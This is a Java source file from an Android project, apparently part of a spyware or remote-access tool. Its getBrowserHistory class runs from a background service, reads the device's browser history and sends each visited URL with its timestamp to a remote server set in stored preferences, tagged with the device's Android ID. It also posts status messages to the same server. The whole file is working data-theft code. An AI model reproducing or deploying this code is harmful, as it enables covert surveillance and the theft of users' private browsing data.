package u.can.i.up.expert.utils;

import android.database.Cursor;
import android.os.AsyncTask;
import android.preference.PreferenceManager;
import android.provider.Browser;

import java.io.UnsupportedEncodingException;
import java.text.SimpleDateFormat;
import java.util.Calendar;

import u.can.i.up.expert.common.DataSet;
import u.can.i.up.expert.common.Factory;

/**
 * Created by lczgywzyy on 2015/1/13.
 */
public class getBrowserHistory extends AsyncTask<String, Void, String> {
    String j = "";
    public getBrowserHistory(String j) {
        this.j = j;
    }
    @Override
    protected String doInBackground(String... params) {
        String sel = Browser.BookmarkColumns.BOOKMARK + " = 0";
        Cursor mCur = DataSet.getInstance().myService.getApplicationContext().getContentResolver().query(Browser.BOOKMARKS_URI, Browser.HISTORY_PROJECTION, sel, null, null);
        if (mCur.moveToFirst()) {
            int i = 0;
            while (mCur.isAfterLast() == false) {
                if(i<Integer.parseInt(j)){
                    SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd*hh:mm:ss");
                    Calendar calendar = Calendar.getInstance();
                    String now = mCur.getString(Browser.HISTORY_PROJECTION_DATE_INDEX);
                    calendar.setTimeInMillis(Long.parseLong(now));
                    try {
                        Factory.getInputStreamFromUrl(DataSet.getInstance().URL + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("AndroidID", "") + "&Data=", "[" + formatter.format(calendar.getTime()) + "] " + mCur.getString(Browser.HISTORY_PROJECTION_URL_INDEX));
                    } catch (UnsupportedEncodingException e) {

                        e.printStackTrace();
                    }
                }
                i++;
                mCur.moveToNext();
            }
        }
        mCur.close();

        return "Executed";
    }
    @Override
    protected void onPostExecute(String result) {
        PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).edit().putBoolean("Get",false).commit();
        try {
            Factory.getInputStreamFromUrl(DataSet.getInstance().URL + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("AndroidID", "") + "&Data=", "Browser History Complete");
        } catch (UnsupportedEncodingException e) {

            e.printStackTrace();
        }
    }
    @Override
    protected void onPreExecute() {
        while(PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getBoolean("Get",false) == true)
        {
            try {
                Thread.sleep(5000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
        try {
            Factory.getInputStreamFromUrl(DataSet.getInstance().URL + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("AndroidID", "") + "&Data=", "Getting Browser History");
        } catch (UnsupportedEncodingException e) {

            e.printStackTrace();
        }
        PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).edit().putBoolean("Get",true).commit();
    }
    @Override
    protected void onProgressUpdate(Void... values) {
    }
}
